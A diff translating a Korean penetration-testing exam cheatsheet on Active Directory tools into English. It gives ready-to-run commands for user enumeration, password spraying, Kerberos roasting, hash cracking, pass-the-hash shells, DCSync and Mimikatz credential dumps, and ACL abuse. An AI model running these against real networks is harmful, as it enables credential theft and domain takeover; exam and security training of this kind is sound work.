@@ -1,89 +1,89 @@
 ---
-title: "Active Directory 도구 (AD Tools)"
+title: "AD Tools"
 date: 2026-06-20
 weight: 90
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "AD 도구를 하는 일 기준으로 정리. 역할, 사용 시점, OSCP 사용 가능 여부를 함께 표기."
+summary: "AD tools organized by what they do, with role, when to use, and OSCP availability."
 ---
 
-AD 도구 총정리 — 이름순이 아니라 하는 일 기준으로 정리. 각 도구마다 역할, 사용 시점, eCPPT 사용 가능 여부, OSCP 사용 가능 여부를 표기.
+A complete overview of AD tools, organized by what they do rather than alphabetically. Each entry lists its role, when to use it, eCPPT availability, and OSCP availability.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/active-directory-tools/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
-- 코드의 `<IP>`, `<DC_IP>`, `<DOMAIN>`, `<USER>`, `<PASS>`, `<NTLM_HASH>` 등은 발견한 값으로 치환
+- Source: https://heretek.dev/oscp-cheatsheet/active-directory-tools/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
+- Replace `<IP>`, `<DC_IP>`, `<DOMAIN>`, `<USER>`, `<PASS>`, `<NTLM_HASH>` in the code with the values you found
 
-## 유저명 찾기 (Phase 1 — creds 불필요)
+## Finding usernames (Phase 1 — no creds needed)
 
 ### nxc (NetExec / CrackMapExec)
 
-- 역할: AD 만능칼. SMB, LDAP, WinRM 통신. 유저·공유·그룹 열거, 패스워드 스프레이, creds 동작 확인, 해시 덤프.
-- 사용 시점: 체인 거의 모든 단계. 기본 도구.
-- eCPPT: 사용 가능 (다수 리뷰어 확인)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: the AD multi-tool. Talks SMB, LDAP, WinRM. Enumerates users/shares/groups, sprays passwords, validates creds, dumps hashes.
+- When to use: at almost every stage of the chain. The default tool.
+- eCPPT: allowed (confirmed by multiple reviewers)
+- OSCP: allowed
+- Key commands:
 
 ```bash
-nxc smb <IP> -u '' -p '' --users           # 유저 열거 (null 세션)
-nxc smb <IP> -u '' -p '' --shares           # 공유 목록 (null 세션)
-nxc smb <IP> -u '' -p '' --rid-brute        # RID 브루트포스로 유저 찾기
-nxc smb <IP> -u 'USER' -p 'PASS' --users   # 유저 열거 (creds 있음)
-nxc smb <IP> -u 'USER' -p 'PASS' --shares  # 공유 목록 (creds 있음)
-nxc smb <IP> -u users.txt -p 'Password1!' --continue-on-success  # 패스워드 스프레이
-nxc smb <SUBNET>/24 -u 'USER' -p 'PASS'    # creds가 통하는 곳 확인 (Pwn3d! = admin)
-nxc smb <IP> -u 'USER' -p 'PASS' --sam     # 로컬 해시 덤프
-nxc smb <IP> -u 'USER' -p 'PASS' --lsa     # LSA secrets 덤프
-nxc winrm <IP> -u 'USER' -p 'PASS'         # WinRM 접근 동작 확인
+nxc smb <IP> -u '' -p '' --users           # enumerate users (null session)
+nxc smb <IP> -u '' -p '' --shares           # list shares (null session)
+nxc smb <IP> -u '' -p '' --rid-brute        # find users via RID brute force
+nxc smb <IP> -u 'USER' -p 'PASS' --users   # enumerate users (with creds)
+nxc smb <IP> -u 'USER' -p 'PASS' --shares  # list shares (with creds)
+nxc smb <IP> -u users.txt -p 'Password1!' --continue-on-success  # password spray
+nxc smb <SUBNET>/24 -u 'USER' -p 'PASS'    # find where creds work (Pwn3d! = admin)
+nxc smb <IP> -u 'USER' -p 'PASS' --sam     # dump local hashes
+nxc smb <IP> -u 'USER' -p 'PASS' --lsa     # dump LSA secrets
+nxc winrm <IP> -u 'USER' -p 'PASS'         # check WinRM access
 ```
 
 ### kerbrute
 
-- 역할: Kerberos에 물어 유효한 유저명인지 확인. DC가 유효/무효 유저에 다르게 응답한다.
-- 사용 시점: Phase 1 — SMB null 세션이 막혔을 때 유효 유저명 찾기.
-- eCPPT: 사용 가능 (시험 Kali에 사전 설치 확인)
-- OSCP: 사용 가능 (직접 다운로드)
-- 설치 (apt 패키지가 아니다):
+- Role: asks Kerberos whether a username is valid. The DC responds differently for valid and invalid users.
+- When to use: Phase 1 — finding valid usernames when SMB null sessions are blocked.
+- eCPPT: allowed (confirmed preinstalled on the exam Kali)
+- OSCP: allowed (download it yourself)
+- Install (it is not an apt package):
 
 ```bash
-# Go 설치되어 있으면 (확인: which go)
+# If Go is installed (check: which go)
 go install github.com/ropnop/kerbrute@latest
 sudo cp ~/go/bin/kerbrute /usr/local/bin/kerbrute
 sudo chmod +x /usr/local/bin/kerbrute
 
-# ARM64 바이너리가 없으면(애플 실리콘), Go로 소스 빌드 필요
+# If there is no ARM64 binary (Apple Silicon), build from source with Go
 ```
 
-- 주요 명령:
+- Key commands:
 
 ```bash
 kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt
 ```
 
-- 워드리스트 우선순위 (빠른 것부터):
+- Wordlist priority (fastest first):
 
 ```bash
-# 1. 최우선 — 작고 빠르며 실제 AD 환경 대부분을 커버 (~1만 개)
+# 1. Top priority — small, fast, covers most real AD environments (~10k)
 /usr/share/seclists/Usernames/Names/names.txt
 
-# 2. 초소형 — 흔한 서비스 계정만
+# 2. Tiny — only common service accounts
 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 
-# 3. 균형 — 유저명 1만 개
+# 3. Balanced — 10k usernames
 /usr/share/seclists/Usernames/xato-net-10-million-usernames-10000.txt
 
-# 4. 최후 — 1,000만 항목, 몇 시간 걸림
+# 4. Last resort — 10 million entries, takes hours
 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 
-- 경고: xato-net-10-million-usernames.txt 로 시작하지 않는다 — 몇 시간 걸린다. names.txt 로 시작하면 대부분의 박스를 몇 초 안에 커버한다.
+- Warning: do not start with xato-net-10-million-usernames.txt — it takes hours. Starting with names.txt covers most boxes within seconds.
 
 ### rpcclient
 
-- 역할: Windows RPC 직접 통신. null 세션으로 유저·그룹 등 열거 가능.
-- 사용 시점: Phase 1 — nxc 가 안 될 때 백업 수단.
-- eCPPT: 사용 가능 (Kali 사전 설치)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: direct Windows RPC communication. Can enumerate users, groups, etc. over a null session.
+- When to use: Phase 1 — a backup when nxc fails.
+- eCPPT: allowed (preinstalled on Kali)
+- OSCP: allowed
+- Key commands:
 
 ```bash
 rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
@@ -92,109 +92,109 @@ rpcclient -U '' -N <DC_IP> -c 'enumdomgroups'
 
 ### enum4linux
 
-- 역할: SMB/RPC 자동 열거 스크립트. 여러 열거 쿼리를 한 번에 실행.
-- 사용 시점: Phase 1 — 유저·공유·그룹 빠른 자동 스캔.
-- eCPPT: 사용 가능 (Kali 사전 설치)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: automated SMB/RPC enumeration script. Runs several enumeration queries at once.
+- When to use: Phase 1 — quick automated scan of users, shares, groups.
+- eCPPT: allowed (preinstalled on Kali)
+- OSCP: allowed
+- Key commands:
 
 ```bash
-enum4linux -U <DC_IP>          # 유저
-enum4linux -a <DC_IP>          # 전부
+enum4linux -U <DC_IP>          # users
+enum4linux -a <DC_IP>          # everything
 ```
 
 ### ldapsearch
 
-- 역할: LDAP 디렉터리 직접 질의. 유저, 그룹, description, 기타 AD 속성 검색.
-- 사용 시점: Phase 1 — 특정 AD 속성이 필요하거나 익명 LDAP 질의할 때.
-- eCPPT: 사용 가능 (Kali 사전 설치)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: direct LDAP directory queries. Search users, groups, description, and other AD attributes.
+- When to use: Phase 1 — when you need a specific AD attribute or anonymous LDAP queries.
+- eCPPT: allowed (preinstalled on Kali)
+- OSCP: allowed
+- Key commands:
 
 ```bash
 ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
 ```
 
-## creds 없이 해시 얻기 (Phase 2-3)
+## Getting hashes without creds (Phase 2-3)
 
 ### impacket-GetNPUsers (AS-REP Roasting)
 
-- 역할: "Kerberos 사전 인증 불필요" 계정을 찾아 패스워드 없이 해시를 받아온다.
-- 사용 시점: Phase 2 — 유저명 확보 직후 첫 공격. 어떤 브루트포스보다 먼저.
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 원리: 사전 인증이 꺼진 계정은 DC가 해시를 공짜로 건넨다.
-- 주요 명령:
+- Role: finds accounts with "Kerberos pre-authentication not required" and retrieves their hash without a password.
+- When to use: Phase 2 — the first attack right after you have usernames. Before any brute force.
+- eCPPT: allowed
+- OSCP: allowed
+- Principle: for accounts with pre-auth disabled, the DC hands out the hash for free.
+- Key commands:
 
 ```bash
 impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile valid_users.txt -format hashcat -outputfile asrep.txt
 ```
 
-- hashcat 모드: 18200
+- hashcat mode: 18200
 - john: `john asrep.txt --wordlist=rockyou.txt`
 
-## creds 있이 해시 얻기 (Phase 7)
+## Getting hashes with creds (Phase 7)
 
 ### impacket-GetUserSPNs (Kerberoasting)
 
-- 역할: SPN 있는 계정의 서비스 티켓을 요청. 티켓은 서비스 계정 패스워드로 암호화되어 있다 — 오프라인 크랙.
-- 사용 시점: Phase 7 — 첫 creds 획득 이후. 아무 도메인 유저나 가능.
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 원리: 아무 도메인 유저나 서비스 티켓 요청 가능. DC가 서비스 계정 패스워드 해시로 암호화해 준다.
-- 주요 명령:
+- Role: requests service tickets for accounts with an SPN. The ticket is encrypted with the service account password — crack it offline.
+- When to use: Phase 7 — after obtaining your first creds. Any domain user can do it.
+- eCPPT: allowed
+- OSCP: allowed
+- Principle: any domain user can request a service ticket. The DC encrypts it with the service account password hash.
+- Key commands:
 
 ```bash
 impacket-GetUserSPNs <DOMAIN>/'USER':'PASS' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
 ```
 
-- hashcat 모드: 13100
+- hashcat mode: 13100
 - john: `john kerberoast.txt --wordlist=rockyou.txt`
 
-### AS-REP vs Kerberoasting — 구분법
+### AS-REP vs Kerberoasting — how to tell them apart
 
-- creds 필요 여부 — AS-REP Roasting: 불필요 / Kerberoasting: 필요
-- 대상 — AS-REP Roasting: "사전 인증 불가" 유저 / Kerberoasting: SPN 있는 서비스 계정
-- impacket 도구 — AS-REP Roasting: GetNPUsers / Kerberoasting: GetUserSPNs
-- hashcat 모드 — AS-REP Roasting: 18200 / Kerberoasting: 13100
-- 체인 위치 — AS-REP Roasting: Phase 2 (creds 이전) / Kerberoasting: Phase 7 (creds 이후)
+- Creds required — AS-REP Roasting: no / Kerberoasting: yes
+- Target — AS-REP Roasting: users with "pre-auth disabled" / Kerberoasting: service accounts with an SPN
+- impacket tool — AS-REP Roasting: GetNPUsers / Kerberoasting: GetUserSPNs
+- hashcat mode — AS-REP Roasting: 18200 / Kerberoasting: 13100
+- Position in the chain — AS-REP Roasting: Phase 2 (before creds) / Kerberoasting: Phase 7 (after creds)
 
-## 해시 크랙
+## Hash cracking
 
 ### hashcat
 
-- 역할: GPU(또는 CPU)로 해시 크랙. 빠르지만 가끔 버그가 있다.
-- eCPPT: 사용 가능 (문제가 생기는 걸로 알려져 있음 — john 백업 필수)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: crack hashes on GPU (or CPU). Fast, but occasionally buggy.
+- eCPPT: allowed (known to have issues — keep john as a backup)
+- OSCP: allowed
+- Key commands:
 
 ```bash
-hashcat -m 18200 asrep.txt wordlist.txt      # AS-REP 해시
-hashcat -m 13100 kerberoast.txt wordlist.txt  # Kerberos TGS 해시
-hashcat -m 5600 ntlmv2.txt wordlist.txt       # NTLMv2 해시
-hashcat -m 1000 ntlm.txt wordlist.txt         # NTLM 해시
+hashcat -m 18200 asrep.txt wordlist.txt      # AS-REP hashes
+hashcat -m 13100 kerberoast.txt wordlist.txt  # Kerberos TGS hashes
+hashcat -m 5600 ntlmv2.txt wordlist.txt       # NTLMv2 hashes
+hashcat -m 1000 ntlm.txt wordlist.txt         # NTLM hashes
 ```
 
 ### john (John the Ripper)
 
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 주요 명령:
+- eCPPT: allowed
+- OSCP: allowed
+- Key commands:
 
 ```bash
-john hash.txt --wordlist=rockyou.txt          # 워드리스트 크랙
-john hash.txt --show                          # 크랙된 패스워드 표시
+john hash.txt --wordlist=rockyou.txt          # wordlist cracking
+john hash.txt --show                          # show cracked passwords
 ```
 
-## 도메인 매핑 (Phase 6)
+## Domain mapping (Phase 6)
 
 ### bloodhound-python
 
-- 역할: Kali에서 AD 데이터 전부 수집(유저, 그룹, 권한, 컴퓨터). BloodHound GUI용 JSON 생성.
-- 사용 시점: Phase 6 — 첫 creds 획득 직후 즉시.
-- eCPPT: 사용 가능 (Kali에 있음)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: collect all AD data from Kali (users, groups, permissions, computers). Produces JSON for the BloodHound GUI.
+- When to use: Phase 6 — immediately after obtaining your first creds.
+- eCPPT: allowed (available on Kali)
+- OSCP: allowed
+- Key commands:
 
 ```bash
 bloodhound-python -u 'USER' -p 'PASS' -ns <DC_IP> -d <DOMAIN> -c All
@@ -202,26 +202,26 @@ bloodhound-python -u 'USER' -p 'PASS' -ns <DC_IP> -d <DOMAIN> -c All
 
 ### BloodHound GUI (Community Edition)
 
-- 역할: AD 데이터 시각화, Domain Admin까지 공격 경로 표시.
-- 사용 시점: bloodhound-python 수집 직후. JSON 업로드, 내 유저 검색, PATHFINDING 사용.
-- eCPPT: 사용 가능 (시험 Kali 사전 설치)
-- OSCP: 사용 가능
-- 주요 동작:
+- Role: visualize AD data and show attack paths to Domain Admin.
+- When to use: right after bloodhound-python collection. Upload the JSON, search your user, use PATHFINDING.
+- eCPPT: allowed (preinstalled on the exam Kali)
+- OSCP: allowed
+- Key actions:
 
-- JSON 파일 업로드 (드래그 앤 드롭)
-- 내 유저 검색 → 우클릭 → Mark as Owned
-- PATHFINDING: 시작 = 내 유저, 끝 = Domain Admins
-- 노드 사이 엣지 클릭 → 관계 유형과 악용 방법 표시
+- Upload JSON files (drag and drop)
+- Search your user → right-click → Mark as Owned
+- PATHFINDING: start = your user, end = Domain Admins
+- Click an edge between nodes → shows the relationship type and how to abuse it
 
-## 쉘 획득 (Phase 8)
+## Getting a shell (Phase 8)
 
 ### evil-winrm
 
-- 역할: WinRM(5985 포트)으로 Windows 접속. 인터랙티브 PowerShell 쉘. 파일 업/다운로드에 최적.
-- 사용 시점: 5985 열려 있고 유효 creds 있을 때.
-- eCPPT: 사용 가능하나 고장으로 알려짐 — Docker 우회: `docker run --rm -ti oscarakaelvis/evil-winrm`
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: connect to Windows over WinRM (port 5985). Interactive PowerShell shell. Best for file upload/download.
+- When to use: 5985 is open and you have valid creds.
+- eCPPT: allowed but known to break — Docker workaround: `docker run --rm -ti oscarakaelvis/evil-winrm`
+- OSCP: allowed
+- Key commands:
 
 ```bash
 evil-winrm -i <IP> -u 'USER' -p 'PASS'
@@ -230,11 +230,11 @@ evil-winrm -i <IP> -u 'USER' -H '<NTLM_HASH>'    # Pass-the-Hash
 
 ### impacket-psexec
 
-- 역할: SMB로 타깃에 서비스 생성, SYSTEM 쉘 제공. 시끄럽지만 확실하다.
-- 사용 시점: admin creds 있고 SYSTEM 쉘이 필요할 때.
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: creates a service on the target over SMB and gives a SYSTEM shell. Loud but reliable.
+- When to use: you have admin creds and need a SYSTEM shell.
+- eCPPT: allowed
+- OSCP: allowed
+- Key commands:
 
 ```bash
 impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<IP>
@@ -243,11 +243,11 @@ impacket-psexec '<DOMAIN>/<USER>'@<IP> -hashes :<NTLM_HASH>    # Pass-the-Hash
 
 ### impacket-wmiexec
 
-- 역할: psexec과 비슷하나 더 은밀. 서비스 생성 대신 WMI 사용.
-- 사용 시점: psexec이 안 되거나 소음을 줄이고 싶을 때.
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: similar to psexec but stealthier. Uses WMI instead of creating a service.
+- When to use: psexec fails or you want less noise.
+- eCPPT: allowed
+- OSCP: allowed
+- Key commands:
 
 ```bash
 impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<IP>
@@ -255,100 +255,100 @@ impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<IP>
 
 ### xfreerdp
 
-- 역할: RDP 클라이언트. 풀 그래픽 데스크톱 제공.
-- 사용 시점: 3389 열려 있거나 GUI 접근이 필요할 때.
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: RDP client. Provides a full graphical desktop.
+- When to use: 3389 is open or you need GUI access.
+- eCPPT: allowed
+- OSCP: allowed
+- Key commands:
 
 ```bash
 xfreerdp /u:'USER' /p:'PASS' /v:<IP> /cert-ignore
 ```
 
-## 크리덴셜 덤프 (Phase 9)
+## Credential dumping (Phase 9)
 
 ### impacket-secretsdump
 
-- 역할: 머신의 모든 해시 덤프(SAM, LSA, NTDS.dit). DCSync로 도메인 전체 해시도 가능.
-- 사용 시점: Phase 9 — 장악한 모든 머신에서. Phase 10 — DA 또는 DCSync 권한 있을 때 DCSync.
-- eCPPT: 사용 가능
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: dumps every hash on a machine (SAM, LSA, NTDS.dit). DCSync can dump all domain hashes too.
+- When to use: Phase 9 — on every machine you compromise. Phase 10 — DCSync when you have DA or DCSync rights.
+- eCPPT: allowed
+- OSCP: allowed
+- Key commands:
 
 ```bash
-impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<IP>              # 전부 덤프
-impacket-secretsdump '<DOMAIN>/<USER>'@<IP> -hashes :<HASH>    # 해시로
-impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>  # DC 전용 — 도메인 전체 해시
+impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<IP>              # dump everything
+impacket-secretsdump '<DOMAIN>/<USER>'@<IP> -hashes :<HASH>    # with a hash
+impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>  # DC only — all domain hashes
 ```
 
 ### Meterpreter + Kiwi (Metasploit)
 
-- 역할: Metasploit 내장 크리덴셜 덤퍼. Kiwi 확장(Mimikatz) 로드 후 해시, 패스워드, 티켓 덤프.
-- 사용 시점: 장악한 머신에서 Meterpreter 쉘이 있을 때.
-- eCPPT: 사용 가능 — 제한 없음 (모든 머신에 사용)
-- OSCP: 제한적 — 한 머신만
-- 주요 명령:
+- Role: Metasploit's built-in credential dumper. Load the Kiwi extension (Mimikatz) to dump hashes, passwords, and tickets.
+- When to use: when you have a Meterpreter shell on a compromised machine.
+- eCPPT: allowed — no restrictions (use on every machine)
+- OSCP: restricted — one machine only
+- Key commands:
 
 ```text
 meterpreter> load kiwi
-meterpreter> creds_all            # 메모리의 모든 크리덴셜
-meterpreter> lsa_dump_sam         # 로컬 계정 해시
-meterpreter> lsa_dump_secrets     # 서비스 계정 패스워드
-meterpreter> hashdump             # 빠른 NTLM 해시 덤프
+meterpreter> creds_all            # all credentials in memory
+meterpreter> lsa_dump_sam         # local account hashes
+meterpreter> lsa_dump_secrets     # service account passwords
+meterpreter> hashdump             # quick NTLM hash dump
 ```
 
-## AD 객체 수정 (ACL 악용)
+## Modifying AD objects (ACL abuse)
 
 ### net rpc
 
-- 역할: Kali에서 AD 그룹·유저 패스워드 원격 수정. Linux 내장 명령.
-- 사용 시점: BloodHound가 그룹에 GenericAll(자신 추가) 또는 유저에 ForceChangePassword 를 보여줄 때.
-- eCPPT: 사용 가능 (Linux/Kali 내장)
-- OSCP: 사용 가능
-- 주요 명령:
+- Role: remotely modify AD groups and user passwords from Kali. A built-in Linux command.
+- When to use: BloodHound shows GenericAll on a group (add yourself) or ForceChangePassword on a user.
+- eCPPT: allowed (built into Linux/Kali)
+- OSCP: allowed
+- Key commands:
 
 ```bash
-# 유저를 그룹에 추가
+# Add a user to a group
 net rpc group addmem "GROUP_NAME" "USERNAME" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>
 
-# 유저 패스워드 변경
+# Change a user's password
 net rpc password "TARGET_USER" "NewP@ss123!" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>
 ```
 
 ### impacket-dacledit
 
-- 역할: AD 객체 권한(ACL/DACL) 수정. DCSync 권한 부여 가능.
-- 사용 시점: BloodHound가 도메인에 WriteDACL 을 보여줄 때.
-- eCPPT: 시험 Kali에 있는지 확실치 않음 (최신 도구)
-- OSCP: 사용 가능 여부 불확실
-- 주요 명령:
+- Role: modify AD object permissions (ACL/DACL). Can grant DCSync rights.
+- When to use: BloodHound shows WriteDACL on the domain.
+- eCPPT: unclear whether it is on the exam Kali (recent tool)
+- OSCP: availability uncertain
+- Key commands:
 
 ```bash
 impacket-dacledit -action 'write' -rights 'DCSync' -principal 'USER' '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
 ```
 
-- 없을 경우 대체: Windows 쉘 또는 evil-winrm 에서 PowerView 사용
+- If missing, alternative: use PowerView from a Windows shell or evil-winrm
 
-## 시험 핵심 리마인더
+## Exam key reminders
 
-### eCPPT 전용
+### eCPPT only
 
-- Metasploit 제한 없음 — 모든 곳에 사용
-- Desktop 워드리스트 순서: common_corporate_passwords.lst → seasons.txt → months.txt → xato-10k → rockyou
-- Evil-WinRM 고장일 수 있다 — Docker 우회 사용
-- hashcat 버그일 수 있다 — john 백업 사용
-- 인터넷 불가 — 사전 설치된 도구만
-- 해시 저장 시 항상 작은따옴표: `echo '$hash' > file.txt`
+- No Metasploit restrictions — use it everywhere
+- Desktop wordlist order: common_corporate_passwords.lst → seasons.txt → months.txt → xato-10k → rockyou
+- Evil-WinRM may break — use the Docker workaround
+- hashcat may be buggy — keep john as a backup
+- No internet — only preinstalled tools
+- Always use single quotes when saving hashes: `echo '$hash' > file.txt`
 
-### OSCP 전용
+### OSCP only
 
-- Metasploit은 한 머신만
-- 리포트 작성 필수
-- AI/LLM 사용 금지
-- 감독(Proctored) 시험
+- Metasploit on one machine only
+- A report is mandatory
+- AI/LLM use is prohibited
+- Proctored exam
 
-### 공통
+### Common
 
-- 새 크리덴셜 발견 → 즉시 전 머신에 스프레이
-- 장악한 모든 머신에서 creds 덤프
-- 모든 creds를 표에 기록: username / password-hash / source / where it works
+- New credential found → spray it on every machine immediately
+- Dump creds on every machine you compromise
+- Record every cred in a table: username / password-hash / source / where it works
